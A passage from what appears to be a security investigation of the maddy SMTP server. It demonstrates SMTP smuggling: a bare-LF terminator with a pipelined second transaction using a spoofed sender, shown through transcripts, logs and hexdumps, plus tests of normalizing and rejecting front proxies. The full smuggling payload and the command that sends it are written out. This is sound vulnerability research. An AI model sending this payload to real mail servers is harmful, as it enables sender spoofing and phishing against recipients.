To: rcpt@example.com<CR><LF>
Subject: framing probe<CR><LF>
<CR><LF>
 .<CR><LF>
not-a-terminator<CR><LF>
embedded . dot in middle<CR><LF>
trailing dot.<CR><LF>

--- delivered body hexdump ---
00000000  52 65 63 65 69 76 65 64 3a 20 66 72 6f 6d 20 63  |Received: from c|
00000010  6c 69 65 6e 74 2e 74 65 73 74 20 28 6c 6f 63 61  |lient.test (loca|
00000020  6c 68 6f 73 74 20 5b 31 32 37 2e 30 2e 30 2e 31  |lhost [127.0.0.1|
00000030  5d 29 20 62 79 20 74 65 73 74 2e 6c 6f 63 61 6c  |]) by test.local|
00000040  0d 0a 20 28 65 6e 76 65 6c 6f 70 65 2d 73 65 6e  |.. (envelope-sen|
00000050  64 65 72 20 3c 73 65 6e 64 65 72 40 65 78 61 6d  |der <sender@exam|
00000060  70 6c 65 2e 63 6f 6d 3e 29 20 77 69 74 68 20 45  |ple.com>) with E|
00000070  53 4d 54 50 20 69 64 20 35 36 62 32 39 38 33 35  |SMTP id 56b29835|
00000080  3b 20 4d 6f 6e 2c 20 31 33 20 4a 75 6c 0d 0a 20  |; Mon, 13 Jul.. |
00000090  32 30 32 36 20 31 38 3a 31 32 3a 30 33 20 2b 30  |2026 18:12:03 +0|
000000a0  30 30 30 0d 0a 46 72 6f 6d 3a 20 73 65 6e 64 65  |000..From: sende|
000000b0  72 40 65 78 61 6d 70 6c 65 2e 63 6f 6d 0d 0a 54  |r@example.com..T|
000000c0  6f 3a 20 72 63 70 74 40 65 78 61 6d 70 6c 65 2e  |o: rcpt@example.|
000000d0  63 6f 6d 0d 0a 53 75 62 6a 65 63 74 3a 20 66 72  |com..Subject: fr|
000000e0  61 6d 69 6e 67 20 70 72 6f 62 65 0d 0a 0d 0a 20  |aming probe.... |
000000f0  2e 0d 0a 6e 6f 74 2d 61 2d 74 65 72 6d 69 6e 61  |...not-a-termina|
00000100  74 6f 72 0d 0a 65 6d 62 65 64 64 65 64 20 2e 20  |tor..embedded . |
00000110  64 6f 74 20 69 6e 20 6d 69 64 64 6c 65 0d 0a 74  |dot in middle..t|
00000120  72 61 69 6c 69 6e 67 20 64 6f 74 2e 0d 0a        |railing dot...|
0000012e
```

**Stability (2 runs).** All five variants were run twice; each was accepted and delivered exactly one message in both runs, with identical delivered message portions per variant. Real msg_ids (run 1 / run 2): V-A `24b69d8a`/`732467d1`, V-B `410a8b94`/`e35cdf41`, V-C `fba35417`/`00abb8f9`, V-D `3ff4db42`/`93240e68`, V-E `56b29835`/`1715d1d9`. Delivered body-only sizes (excluding the ~165-byte `Received` header): V-A 131 B, **V-B 131 B — byte-identical to V-A (SHA-256 `6fafed38…`)**, V-C 133 B, V-D 160 B, V-E 137 B (full delivered-message sizes with the `Received` header were 296/296/298/325/302 B). No run-to-run variation observed.

---

### Q3 — Pipelined pressure vs a stricter peer (SMTP smuggling)

**Mechanism (cause -> effect).** `net/textproto` reads through a buffered reader (`bufio`), so bytes sent **after** the terminator in the same `send()` are already sitting in that buffer. A bare-LF `<LF>.<LF>` is accepted as end-of-data by `dotReader` (directly `stateDot`+`\n`->`stateEOF`, `reader.go:L362-363`); `handleData` then drains the data reader (`conn.go:L521`), writes `250` (`conn.go:L522`), and `Conn.reset` (`conn.go:L694`, deferred at `:L512`) clears `fromReceived` (`conn.go:L701`) and `recipients` (`conn.go:L702`). The next read off the still-buffered stream is parsed as a **new** command, so a pipelined `MAIL/RCPT/DATA` after the bare-LF terminator becomes a **second transaction**. **(observed).**

**Exact command.** One connection, one `send()`: transaction 1 (`legit@example.com`) ends with a bare-LF `<LF>.<LF>`, immediately followed (pipelined) by transaction 2 with a **spoofed** `MAIL FROM:<SPOOFED-attacker@evil.example>` / `RCPT TO:<victim@example.com>` and a canonical `<CRLF>.<CRLF>`:
```bash
python3 /tmp/maddy-smtp/rawclient.py smuggle 127.0.0.1 2525
```

**Result — maddy accepts TWO transactions and delivers TWO messages** (the second with the spoofed envelope). All three channels, run 1 of 2.

Channel 1 — client transcript (the whole exchange is a single pipelined `send()`; note the two `250 2.0.0 OK: queued` replies):
```text
$ python3 /tmp/maddy-smtp/rawclient.py smuggle 127.0.0.1 2525
### rawclient mode=smuggle target=127.0.0.1:2525
[S->C greeting]
220 test.local ESMTP Service Ready<CR><LF>

[C->S ONE pipelined send() (smuggling)]
EHLO client.test<CR><LF>
MAIL FROM:<legit@example.com><CR><LF>
RCPT TO:<rcpt@example.com><CR><LF>
DATA<CR><LF>
Subject: first (legit) message<CR><LF>
<CR><LF>
This is the visible first message body.<LF>
.<LF>
MAIL FROM:<SPOOFED-attacker@evil.example><CR><LF>
RCPT TO:<victim@example.com><CR><LF>
DATA<CR><LF>
Subject: SMUGGLED second message<CR><LF>
<CR><LF>
This body was smuggled past the DATA boundary.<CR><LF>
.<CR><LF>

[S->C all replies]
250-Hello client.test<CR><LF>
250-PIPELINING<CR><LF>
250-8BITMIME<CR><LF>
250-ENHANCEDSTATUSCODES<CR><LF>
250-SMTPUTF8<CR><LF>
250 SIZE 33554432<CR><LF>
250 2.0.0 Roger, accepting mail from <legit@example.com><CR><LF>
250 2.0.0 I'll make sure <rcpt@example.com> gets this<CR><LF>
354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF><CR><LF>
250 2.0.0 OK: queued<CR><LF>
250 2.0.0 Roger, accepting mail from <SPOOFED-attacker@evil.example><CR><LF>
250 2.0.0 I'll make sure <victim@example.com> gets this<CR><LF>
354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF><CR><LF>
250 2.0.0 OK: queued<CR><LF>

[C->S]
QUIT<CR><LF>

[S->C]
221 2.0.0 Goodnight and good luck<CR><LF>

### rawclient done (mode=smuggle)
```

Channel 2 — maddy `io_debug` (the entire pipelined payload arrives as **one** raw chunk at the top; the two `incoming message` / `accepted` blocks share the **same** `src_ip 127.0.0.1:48934`, i.e. one TCP connection produced two transactions; the second sender is `SPOOFED-attacker@evil.example`):
```text
$ # per-run delta of /tmp/maddy-smtp/maddy.log
smtp: 220 test.local ESMTP Service Ready

smtp: EHLO client.test
MAIL FROM:<legit@example.com>
RCPT TO:<rcpt@example.com>
DATA
Subject: first (legit) message

This is the visible first message body.
.
MAIL FROM:<SPOOFED-attacker@evil.example>
RCPT TO:<victim@example.com>
DATA
Subject: SMUGGLED second message

This body was smuggled past the DATA boundary.
.

smtp: 250-Hello client.test

smtp: 250-PIPELINING

smtp: 250-8BITMIME

smtp: 250-ENHANCEDSTATUSCODES

smtp: 250-SMTPUTF8

smtp: 250 SIZE 33554432

smtp: incoming message	{"msg_id":"0e93834c","sender":"legit@example.com","src_host":"client.test","src_ip":"127.0.0.1:48934"}
[debug] smtp/pipeline: sender legit@example.com matched by default rule	{"msg_id":"0e93834c"}
smtp: 250 2.0.0 Roger, accepting mail from <legit@example.com>

[debug] smtp/pipeline: global rcpt modifiers: rcpt@example.com => rcpt@example.com	{"msg_id":"0e93834c"}
[debug] smtp/pipeline: per-source rcpt modifiers: rcpt@example.com => rcpt@example.com	{"msg_id":"0e93834c"}
[debug] smtp/pipeline: recipient rcpt@example.com matched by default rule (clean = rcpt@example.com)	{"msg_id":"0e93834c"}
[debug] smtp/pipeline: per-rcpt modifiers: rcpt@example.com => rcpt@example.com	{"msg_id":"0e93834c"}
[debug] smtp_downstream: connected	{"downstream_server":"127.0.0.1","msg_id":"0e93834c"}
[debug] smtp_downstream: connected	{"msg_id":"0e93834c","remote_server":"127.0.0.1"}
[debug] smtp/pipeline: tgt.Start(legit@example.com) ok, target = smtp_downstream:	{"msg_id":"0e93834c"}
smtp: RCPT ok	{"msg_id":"0e93834c","rcpt":"rcpt@example.com"}
smtp: 250 2.0.0 I'll make sure <rcpt@example.com> gets this

smtp: 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>

[debug] smtp/pipeline: delivery.Body ok, Delivery object = *msgpipeline.delivery	{"msg_id":"0e93834c"}
smtp: accepted	{"msg_id":"0e93834c"}
smtp: 250 2.0.0 OK: queued

[debug] smtp: reset
smtp: incoming message	{"msg_id":"d76bd115","sender":"SPOOFED-attacker@evil.example","src_host":"client.test","src_ip":"127.0.0.1:48934"}
[debug] smtp/pipeline: sender SPOOFED-attacker@evil.example matched by default rule	{"msg_id":"d76bd115"}
smtp: 250 2.0.0 Roger, accepting mail from <SPOOFED-attacker@evil.example>

[debug] smtp/pipeline: global rcpt modifiers: victim@example.com => victim@example.com	{"msg_id":"d76bd115"}
[debug] smtp/pipeline: per-source rcpt modifiers: victim@example.com => victim@example.com	{"msg_id":"d76bd115"}
[debug] smtp/pipeline: recipient victim@example.com matched by default rule (clean = victim@example.com)	{"msg_id":"d76bd115"}
[debug] smtp/pipeline: per-rcpt modifiers: victim@example.com => victim@example.com	{"msg_id":"d76bd115"}
[debug] smtp_downstream: connected	{"downstream_server":"127.0.0.1","msg_id":"d76bd115"}
[debug] smtp_downstream: connected	{"msg_id":"d76bd115","remote_server":"127.0.0.1"}
[debug] smtp/pipeline: tgt.Start(SPOOFED-attacker@evil.example) ok, target = smtp_downstream:	{"msg_id":"d76bd115"}
smtp: RCPT ok	{"msg_id":"d76bd115","rcpt":"victim@example.com"}
smtp: 250 2.0.0 I'll make sure <victim@example.com> gets this

smtp: 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>

[debug] smtp/pipeline: delivery.Body ok, Delivery object = *msgpipeline.delivery	{"msg_id":"d76bd115"}
smtp: accepted	{"msg_id":"d76bd115"}
smtp: 250 2.0.0 OK: queued

[debug] smtp: reset
smtp: QUIT

smtp: 221 2.0.0 Goodnight and good luck
```

Channel 3 — the sink: **TWO** delivered messages, **with full bodies**. The decisive proof that the bare-LF `<LF>.<LF>` genuinely terminated transaction 1 is that message #13's delivered body (239 bytes) contains **only** `Subject: first (legit) message` and `This is the visible first message body.` — the smuggled `MAIL FROM`/`RCPT`/`DATA`/second subject/second body are **absent** from it. Message #14 is the smuggled transaction, carrying the spoofed sender `SPOOFED-attacker@evil.example` and a different recipient `victim@example.com`:
```text
$ # delivered messages captured at the sink (both bodies + hexdumps):
========== DELIVERED MESSAGE #13 from 127.0.0.1:44706 ==========
ENVELOPE MAIL FROM:<legit@example.com> BODY=8BITMIME
ENVELOPE RCPT TO:<rcpt@example.com>
--- delivered body (unstuffed, 239 bytes) visible-control-chars ---
Received: from client.test (localhost [127.0.0.1]) by test.local<CR><LF>
 (envelope-sender <legit@example.com>) with ESMTP id 0e93834c; Mon, 13 Jul<CR><LF>
 2026 18:13:36 +0000<CR><LF>
Subject: first (legit) message<CR><LF>
<CR><LF>
This is the visible first message body.<CR><LF>

--- delivered body hexdump ---
00000000  52 65 63 65 69 76 65 64 3a 20 66 72 6f 6d 20 63  |Received: from c|
00000010  6c 69 65 6e 74 2e 74 65 73 74 20 28 6c 6f 63 61  |lient.test (loca|
00000020  6c 68 6f 73 74 20 5b 31 32 37 2e 30 2e 30 2e 31  |lhost [127.0.0.1|
00000030  5d 29 20 62 79 20 74 65 73 74 2e 6c 6f 63 61 6c  |]) by test.local|
00000040  0d 0a 20 28 65 6e 76 65 6c 6f 70 65 2d 73 65 6e  |.. (envelope-sen|
00000050  64 65 72 20 3c 6c 65 67 69 74 40 65 78 61 6d 70  |der <legit@examp|
00000060  6c 65 2e 63 6f 6d 3e 29 20 77 69 74 68 20 45 53  |le.com>) with ES|
00000070  4d 54 50 20 69 64 20 30 65 39 33 38 33 34 63 3b  |MTP id 0e93834c;|
00000080  20 4d 6f 6e 2c 20 31 33 20 4a 75 6c 0d 0a 20 32  | Mon, 13 Jul.. 2|
00000090  30 32 36 20 31 38 3a 31 33 3a 33 36 20 2b 30 30  |026 18:13:36 +00|
000000a0  30 30 0d 0a 53 75 62 6a 65 63 74 3a 20 66 69 72  |00..Subject: fir|
000000b0  73 74 20 28 6c 65 67 69 74 29 20 6d 65 73 73 61  |st (legit) messa|
000000c0  67 65 0d 0a 0d 0a 54 68 69 73 20 69 73 20 74 68  |ge....This is th|
000000d0  65 20 76 69 73 69 62 6c 65 20 66 69 72 73 74 20  |e visible first |
000000e0  6d 65 73 73 61 67 65 20 62 6f 64 79 2e 0d 0a     |message body...|
000000ef
--- raw wire bytes received for DATA (incl terminator, 242 bytes) ---
Received: from client.test (localhost [127.0.0.1]) by test.local<CR><LF>
 (envelope-sender <legit@example.com>) with ESMTP id 0e93834c; Mon, 13 Jul<CR><LF>
 2026 18:13:36 +0000<CR><LF>
Subject: first (legit) message<CR><LF>
<CR><LF>
This is the visible first message body.<CR><LF>
.<CR><LF>

========== END MESSAGE #13 (saved /tmp/maddy-smtp/delivered/msg-013-90281.bin) ==========
========== DELIVERED MESSAGE #14 from 127.0.0.1:44718 ==========
ENVELOPE MAIL FROM:<SPOOFED-attacker@evil.example> BODY=8BITMIME
ENVELOPE RCPT TO:<victim@example.com>
--- delivered body (unstuffed, 260 bytes) visible-control-chars ---
Received: from client.test (localhost [127.0.0.1]) by test.local<CR><LF>
 (envelope-sender <SPOOFED-attacker@evil.example>) with ESMTP id d76bd115;<CR><LF>
 Mon, 13 Jul 2026 18:13:36 +0000<CR><LF>
Subject: SMUGGLED second message<CR><LF>
<CR><LF>
This body was smuggled past the DATA boundary.<CR><LF>

--- delivered body hexdump ---
00000000  52 65 63 65 69 76 65 64 3a 20 66 72 6f 6d 20 63  |Received: from c|
00000010  6c 69 65 6e 74 2e 74 65 73 74 20 28 6c 6f 63 61  |lient.test (loca|
00000020  6c 68 6f 73 74 20 5b 31 32 37 2e 30 2e 30 2e 31  |lhost [127.0.0.1|
00000030  5d 29 20 62 79 20 74 65 73 74 2e 6c 6f 63 61 6c  |]) by test.local|
00000040  0d 0a 20 28 65 6e 76 65 6c 6f 70 65 2d 73 65 6e  |.. (envelope-sen|
00000050  64 65 72 20 3c 53 50 4f 4f 46 45 44 2d 61 74 74  |der <SPOOFED-att|
00000060  61 63 6b 65 72 40 65 76 69 6c 2e 65 78 61 6d 70  |acker@evil.examp|
00000070  6c 65 3e 29 20 77 69 74 68 20 45 53 4d 54 50 20  |le>) with ESMTP |
00000080  69 64 20 64 37 36 62 64 31 31 35 3b 0d 0a 20 4d  |id d76bd115;.. M|
00000090  6f 6e 2c 20 31 33 20 4a 75 6c 20 32 30 32 36 20  |on, 13 Jul 2026 |
000000a0  31 38 3a 31 33 3a 33 36 20 2b 30 30 30 30 0d 0a  |18:13:36 +0000..|
000000b0  53 75 62 6a 65 63 74 3a 20 53 4d 55 47 47 4c 45  |Subject: SMUGGLE|
000000c0  44 20 73 65 63 6f 6e 64 20 6d 65 73 73 61 67 65  |D second message|
000000d0  0d 0a 0d 0a 54 68 69 73 20 62 6f 64 79 20 77 61  |....This body wa|
000000e0  73 20 73 6d 75 67 67 6c 65 64 20 70 61 73 74 20  |s smuggled past |
000000f0  74 68 65 20 44 41 54 41 20 62 6f 75 6e 64 61 72  |the DATA boundar|
00000100  79 2e 0d 0a                                      |y...|
00000104
--- raw wire bytes received for DATA (incl terminator, 263 bytes) ---
Received: from client.test (localhost [127.0.0.1]) by test.local<CR><LF>
 (envelope-sender <SPOOFED-attacker@evil.example>) with ESMTP id d76bd115;<CR><LF>
 Mon, 13 Jul 2026 18:13:36 +0000<CR><LF>
Subject: SMUGGLED second message<CR><LF>
<CR><LF>
This body was smuggled past the DATA boundary.<CR><LF>
.<CR><LF>

========== END MESSAGE #14 (saved /tmp/maddy-smtp/delivered/msg-014-90281.bin) ==========
```

**Conformance contrast — a NAMED strict peer, run against the identical bytes.** `strictpeer.py` (banner `220 strictpeer.local ESMTP RFC5321-strict`, listening on `127.0.0.1:2527`) is a reference receiver that treats `<LF>.<LF>` as ordinary body content — i.e. it recognizes end-of-mail-data **only** on `<CRLF>.<CRLF>` per RFC 5321 §4.1.1.4. It was fed the **byte-for-byte identical** smuggle payload:
```text
$ python3 /tmp/maddy-smtp/rawclient.py smuggle 127.0.0.1 2527   # -> the RFC5321-strict peer
### rawclient mode=smuggle target=127.0.0.1:2527
[S->C greeting]
220 strictpeer.local ESMTP RFC5321-strict<CR><LF>

[C->S ONE pipelined send() (smuggling)]
EHLO client.test<CR><LF>
MAIL FROM:<legit@example.com><CR><LF>
RCPT TO:<rcpt@example.com><CR><LF>
DATA<CR><LF>
Subject: first (legit) message<CR><LF>
<CR><LF>
This is the visible first message body.<LF>
.<LF>
MAIL FROM:<SPOOFED-attacker@evil.example><CR><LF>
RCPT TO:<victim@example.com><CR><LF>
DATA<CR><LF>
Subject: SMUGGLED second message<CR><LF>
<CR><LF>
This body was smuggled past the DATA boundary.<CR><LF>
.<CR><LF>

[S->C all replies]
250-strictpeer.local<CR><LF>
250 PIPELINING<CR><LF>
250 2.1.0 Ok<CR><LF>
250 2.1.5 Ok<CR><LF>
354 End data with <CR><LF>.<CR><LF><CR><LF>
250 2.0.0 Ok: strict-queued<CR><LF>

[C->S]
QUIT<CR><LF>

[S->C]
221 2.0.0 Bye<CR><LF>

### rawclient done (mode=smuggle)

$ # strict peer's received-message log (run 1):
========== STRICT-PEER MESSAGE #1 from 127.0.0.1:39642 ==========
ENVELOPE MAIL FROM:<legit@example.com>
ENVELOPE RCPT TO:<rcpt@example.com>
--- body (238 bytes) — bare-LF <LF>.<LF> treated as BODY, not terminator ---
Subject: first (legit) message<CR><LF>
<CR><LF>
This is the visible first message body.<LF>
<LF>
MAIL FROM:<SPOOFED-attacker@evil.example><CR><LF>
RCPT TO:<victim@example.com><CR><LF>
DATA<CR><LF>
Subject: SMUGGLED second message<CR><LF>
<CR><LF>
This body was smuggled past the DATA boundary.<CR><LF>

--- smuggled 'MAIL FROM:<SPOOFED...>' present IN BODY as text? YES ---
>>> STRICT-PEER accepted 1 message(s) on connection from 127.0.0.1:39642
```

The strict peer accepted **exactly one** message; the bare-LF `<LF>.<LF>` and the pipelined `MAIL FROM:<SPOOFED-attacker@evil.example>` / `RCPT` / `DATA` lines all survived **as body text** of that single message (238-byte body). So on the identical input, **maddy delivered two messages (one spoofed) while the RFC-5321-strict peer delivered one, with the smuggled commands demoted to inert body text.** That divergence between "what maddy accepts as a new transaction" and "what a strict peer still treats as body" is precisely the SMTP-smuggling condition. **(observed — both maddy and the named strict peer were run on the same bytes).**

**Security impact (scope note).** What is *demonstrated here* is strictly a message-boundary / envelope split: maddy manufactures a second SMTP transaction with an attacker-chosen `MAIL FROM`/`RCPT TO` out of bytes a strict peer would keep as body. Whether that split translates into an SPF/DKIM/DMARC authentication bypass depends on the downstream authentication configuration, which this minimal harness does **not** configure or exercise; that impact is therefore reported as deployment-dependent, sourced context in §4 (RFC 5321 §2.3.8/§4.1.1.4, RFC 5322, and the December 2023 SMTP-smuggling disclosure / Postfix CVE-2023-51764), not as something observed here.

**Stability (2 runs).** Run twice: **2 accepted + 2 delivered each run** on maddy. msg_ids `0e93834c`+`d76bd115` (run 1) and `808cc46b`+`8aebc040` (run 2); the spoofed envelope (`SPOOFED-attacker@evil.example` -> `victim@example.com`) appeared in both runs. The strict peer accepted **exactly one** message on **each** of its two runs. No variation observed.

---

### Q4 — Back-to-back stability

**Mechanism (cause -> effect).** The terminator decision is a deterministic FSM (`dotReader`, `reader.go:L323-408`) driven only by the input bytes, so identical input must yield identical outcomes. Between transactions on one connection, go-smtp's `Conn.reset` (`conn.go:L694`) clears the envelope and maddy's `Session.Reset` (`smtp.go:L60`) logs `[debug] smtp: reset`; a fresh `MAIL FROM` starts the next transaction cleanly. This determinism is **observed** (below), not merely asserted from the FSM. **(observed).**

**Exact commands.** (a) five identical canonical messages on **fresh** connections, as two independent batches, with an explicit aggregation step counting the new delivered `.bin` files, tallying their body-only SHA-256, and counting `accepted`; (b) three transactions **back-to-back on one** connection:
```bash
# (a) two independent batches of 5 fresh-connection canonical messages, each with aggregation:
before=$(ls /tmp/maddy-smtp/delivered/*.bin | wc -l)
for i in 1 2 3 4 5; do python3 /tmp/maddy-smtp/rawclient.py canonical 127.0.0.1 2525; done   # batch A
after=$(ls /tmp/maddy-smtp/delivered/*.bin | wc -l)
# body-only (strip the folded 3-line Received: header) SHA-256 tally over the 5 new files:
ls -t /tmp/maddy-smtp/delivered/*.bin | head -5 | while read f; do tail -n +4 "$f" | sha256sum; done | sort | uniq -c
# (repeat identically for batch B)
# (b) three back-to-back transactions on ONE connection:
python3 /tmp/maddy-smtp/rawclient.py backtoback 127.0.0.1 2525
```

**Result — deterministic, no wobble.**

(a) The two independent batches — captured aggregation output (each batch added exactly 5 delivered files, and the body-only SHA-256 tally is a single line `5 <hash>`, i.e. all five bodies identical; the hash `6fafed38…` is the very same canonical body hash observed for Q2 V-A/V-B):
```text
batch A: fresh-connection canonical x5
  delivered .bin files before=16 after=21 (delta=5)
  distinct-body-sha256:       5 6fafed38f64a7386bbc798e3f3f801fc9d023b71bf1a6e00f8af8b402fc47932
batchA accepted=5

batch B: fresh-connection canonical x5
  delivered .bin files before=21 after=26 (delta=5)
  distinct-body-sha256:       5 6fafed38f64a7386bbc798e3f3f801fc9d023b71bf1a6e00f8af8b402fc47932
batchB accepted=5
```

Post-hoc reproducible re-verification over the **entire** delivered corpus (the canonical body hash appears identically for every canonical delivery across the whole investigation — 19 occurrences — confirming the decode+relay round trip is byte-stable):
```text
$ for f in /tmp/maddy-smtp/delivered/*.bin; do tail -n +4 "$f" | sha256sum | cut -d' ' -f1; done | sort | uniq -c | sort -rn | head -1
     19 6fafed38f64a7386bbc798e3f3f801fc9d023b71bf1a6e00f8af8b402fc47932
```

(b) Three transactions back-to-back on **one** connection — the maddy structured log shows three `accepted` interleaved with three `[debug] smtp: reset` (the envelope reset between transactions), and every transaction shares the **same** `src_ip` (one TCP connection). Run 1 (`src_ip 127.0.0.1:34888`):
```text
$ python3 /tmp/maddy-smtp/rawclient.py backtoback 127.0.0.1 2525
$ # maddy structured log (run 1): 3 incoming / 3 accepted / 3 reset, one connection
smtp: incoming message	{"msg_id":"4215bc36","sender":"sender1@example.com","src_host":"client.test","src_ip":"127.0.0.1:34888"}
smtp: accepted	{"msg_id":"4215bc36"}
[debug] smtp: reset
smtp: incoming message	{"msg_id":"3f6eea2c","sender":"sender2@example.com","src_host":"client.test","src_ip":"127.0.0.1:34888"}
smtp: accepted	{"msg_id":"3f6eea2c"}
[debug] smtp: reset
smtp: incoming message	{"msg_id":"db580f88","sender":"sender3@example.com","src_host":"client.test","src_ip":"127.0.0.1:34888"}
smtp: accepted	{"msg_id":"db580f88"}
[debug] smtp: reset

$ # sink (run 1): 3 delivered messages, distinct senders sender1/2/3@example.com
========== DELIVERED MESSAGE #27 from 127.0.0.1:50612 ==========
ENVELOPE MAIL FROM:<sender1@example.com> BODY=8BITMIME
========== DELIVERED MESSAGE #28 from 127.0.0.1:50616 ==========
ENVELOPE MAIL FROM:<sender2@example.com> BODY=8BITMIME
========== DELIVERED MESSAGE #29 from 127.0.0.1:50626 ==========
ENVELOPE MAIL FROM:<sender3@example.com> BODY=8BITMIME
```

Run 2 (a fresh connection, `src_ip 127.0.0.1:54530`) reproduced the identical shape — 3 accepted, 3 resets:
```text
$ # maddy structured log (run 2): 3 incoming / 3 accepted / 3 reset, one connection
smtp: incoming message	{"msg_id":"272c26de","sender":"sender1@example.com","src_host":"client.test","src_ip":"127.0.0.1:54530"}
smtp: accepted	{"msg_id":"272c26de"}
[debug] smtp: reset
smtp: incoming message	{"msg_id":"5fddc226","sender":"sender2@example.com","src_host":"client.test","src_ip":"127.0.0.1:54530"}
smtp: accepted	{"msg_id":"5fddc226"}
[debug] smtp: reset
smtp: incoming message	{"msg_id":"4c0e88af","sender":"sender3@example.com","src_host":"client.test","src_ip":"127.0.0.1:54530"}
smtp: accepted	{"msg_id":"4c0e88af"}
[debug] smtp: reset
```

The envelope reset between transactions is `go-smtp`'s `Conn.reset` (`conn.go:L694`) plus maddy's `Session.Reset` (`smtp.go:L60`); the connection/session itself is **not** reset between transactions (same `src_ip`, no re-`EHLO`), which is exactly why Q6's post-error probe can continue on the same connection.

**Stability (2 runs).** (a) two independent 5-message batches -> **5/5 accepted each (10/10 total), one distinct delivered-body hash per batch** (`6fafed38…`). (b) back-to-back run twice -> **3/3 accepted+delivered each, 3 envelope resets each.** Real msg_ids: run 1 `4215bc36`/`3f6eea2c`/`db580f88`, run 2 `272c26de`/`5fddc226`/`4c0e88af`. Observed outcome distribution: a single stable outcome (100% accepted); no run-to-run variation, no wobble.

---

### Q5 — A cleaning / blocking front proxy

A small, hardened stdlib TCP proxy (`/tmp/maddy-smtp/proxy.py`, full source in §7) sits in front of maddy on `127.0.0.1:2524 -> 127.0.0.1:2525`, in two modes. The **same** ambiguous bare-LF smuggling payload from Q3 is routed through each. The proxy is **instrumented**: for every chunk it logs the byte range `[start..end)`, the event (`FORWARDED` / `NORMALIZED` / `REJECTED`), and on rejection the exact `offset` of the first bare LF and the running `forwarded_prefix_bytes`. It validates its mode argument (unknown modes abort rather than fail open), uses a `mktemp -d` 0700 working dir, bounds its scan buffer, sets socket deadlines, and cleans up in a `finally` block.

**Proxy lifecycle (PID / readiness / shutdown).** Each proxy run captures its PID, waits for listener readiness, runs two correlated experiment runs, then is shut down by that exact PID (this is the general pattern; each experiment below states its own exact `proxy.py <mode>` and `rawclient.py <mode>` invocation, which is what determines its result):
```bash
nohup python3 /tmp/maddy-smtp/proxy.py reject 2524 127.0.0.1 2525 /tmp/maddy-smtp/proxy.log > /tmp/maddy-smtp/proxy_stderr.log 2>&1 &
PROXY_PID=$!; echo "$PROXY_PID" > /tmp/maddy-smtp/proxy.pid
wait_port 2524                       # readiness gate: block until 2524 accepts
python3 /tmp/maddy-smtp/rawclient.py smuggle 127.0.0.1 2524   # run 1 THROUGH the proxy
python3 /tmp/maddy-smtp/rawclient.py smuggle 127.0.0.1 2524   # run 2 THROUGH the proxy
kill "$PROXY_PID"; sleep 0.3         # shutdown by captured PID
```
Readiness is independently confirmed by the proxy log's first line (which also records the PID), e.g. `proxy[normalize pid=93933] listening 127.0.0.1:2524 -> 127.0.0.1:2525 (log=/tmp/maddy-smtp/proxy.log)`.

**Q5a — normalize (bare `\n` -> `\r\n`): the smuggle boundary is MANUFACTURED.** **Mechanism:** rewriting every bare `\n` to `\r\n` turns the first transaction's bare-LF `<LF>.<LF>` into a canonical `<CRLF>.<CRLF>` before maddy sees it. **Effect (observed): the smuggle is not prevented — it is *manufactured* into a fully canonical boundary,** so maddy still delivers two messages including the spoofed one. This is the "clean-up" front-end (the Cisco-normalizes-bare-LF analogue) that can *create* an unambiguous smuggling boundary out of ambiguous input. The instrumented proxy log shows the rewrite as one event — the input `<LF>.<LF>` becomes output `<CRLF>.<CRLF>`, lengthening the stream from 325 to 327 bytes:
```text
$ # command (Q5a normalize) - start the normalize proxy, then route the SAME Q3 payload through it (run twice), then stop the proxy by its PID:
$ nohup python3 /tmp/maddy-smtp/proxy.py normalize 2524 127.0.0.1 2525 /tmp/maddy-smtp/proxy.log >/tmp/maddy-smtp/proxy_stderr.log 2>&1 & PROXY_PID=$!; wait_port 2524
$ python3 /tmp/maddy-smtp/rawclient.py smuggle 127.0.0.1 2524          # x2 through the proxy; then: kill "$PROXY_PID"
$ # proxy (pid=93933): the single c->s NORMALIZED event (note in=...<LF>.<LF>... vs out=...<CRLF>.<CRLF>...):
proxy[normalize pid=93933] c->s bytes [0..325) NORMALIZED in=325 out=327: in=EHLO client.test<CR><LF>MAIL FROM:<legit@example.com><CR><LF>RCPT TO:<rcpt@example.com><CR><LF>DATA<CR><LF>Subject: first (legit) message<CR><LF><CR><LF>This is the visible first message body.<LF>.<LF>MAIL FROM:<SPOOFED-attacker@evil.example><CR><LF>RCPT TO:<victim@example.com><CR><LF>DATA<CR><LF>Subject: SMUGGLED second message<CR><LF><CR><LF>This body was smuggled past the DATA boundary.<CR><LF>.<CR><LF> | out=EHLO client.test<CR><LF>MAIL FROM:<legit@example.com><CR><LF>RCPT TO:<rcpt@example.com><CR><LF>DATA<CR><LF>Subject: first (legit) message<CR><LF><CR><LF>This is the visible first message body.<CR><LF>.<CR><LF>MAIL FROM:<SPOOFED-attacker@evil.example><CR><LF>RCPT TO:<victim@example.com><CR><LF>DATA<CR><LF>Subject: SMUGGLED second message<CR><LF><CR><LF>This body was smuggled past the DATA boundary.<CR><LF>.<CR><LF>

$ # maddy (run 1): STILL two accepted (the boundary was manufactured, not blocked):
smtp: incoming message	{"msg_id":"d956e5db","sender":"legit@example.com","src_host":"client.test","src_ip":"127.0.0.1:47882"}
smtp: accepted	{"msg_id":"d956e5db"}
smtp: incoming message	{"msg_id":"1635808a","sender":"SPOOFED-attacker@evil.example","src_host":"client.test","src_ip":"127.0.0.1:47882"}
smtp: accepted	{"msg_id":"1635808a"}

$ # sink (run 1): two delivered messages, including the spoofed envelope:
========== DELIVERED MESSAGE #33 from 127.0.0.1:46004 ==========
ENVELOPE MAIL FROM:<legit@example.com> BODY=8BITMIME
========== DELIVERED MESSAGE #34 from 127.0.0.1:46014 ==========
ENVELOPE MAIL FROM:<SPOOFED-attacker@evil.example> BODY=8BITMIME
```

**Q5b — reject (refuse bare `\n`): a bounded invariant, plus packetization dependence.** **Mechanism:** the proxy scans the client->server stream and, on the first bare `\n` (always at **offset 156** for this payload), emits a `500` to the client, logs `REJECTION: kind=bare LF offset=156 forwarded_prefix_bytes=<N>`, and closes without forwarding the bare-LF byte or anything after it. **Bounded invariant (observed):** `forwarded_prefix_bytes <= 156` in every case, so **no complete message ever reaches maddy and the sink delivers zero — regardless of how the client's bytes are packetized.** What *does* depend on packetization is only how far maddy progresses before the connection is cut:

*Case 1 — single chunk* (the whole payload arrives in one `send()`): the proxy finds the bare LF before forwarding anything, so `forwarded_prefix_bytes=0` and maddy sees only its `220` greeting:
```text
